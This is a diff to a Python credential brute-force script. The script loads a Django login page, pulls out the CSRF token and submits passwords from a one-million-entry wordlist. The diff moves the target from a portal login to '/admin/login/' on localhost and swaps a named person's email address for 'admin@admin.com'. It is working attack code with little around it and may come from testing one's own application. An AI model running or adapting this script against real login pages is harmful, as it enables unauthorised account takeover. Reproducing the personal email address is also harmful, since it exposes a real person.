@@ -2,14 +2,14 @@ import requests
 
 from lxml import html
 
-TARGET_URL = 'http://localhost:8000/backend/portal/login/'
-EMAIL = 'marcy@thinknimble.com'
+TARGET_URL = 'http://localhost:8000/admin/login/'
+USERNAME = 'admin@admin.com'
 WORDLIST = 'Passwords-master/10_million_password_list_top_1000000.txt'
 
 
 def brute_force():
     print(f'Target: {TARGET_URL}')
-    print(f'Trying passwords for {EMAIL}.')
+    print(f'Trying passwords for {USERNAME}.')
     # Request initial page
     client = requests.session()
     page = client.get(TARGET_URL)
@@ -38,7 +38,7 @@ def brute_force():
         count += 1
         print_count(count)
         body = {
-            'username': EMAIL,
+            'username': USERNAME,
             'password': password,
             'csrfmiddlewaretoken': csrf_middleware_token
         }
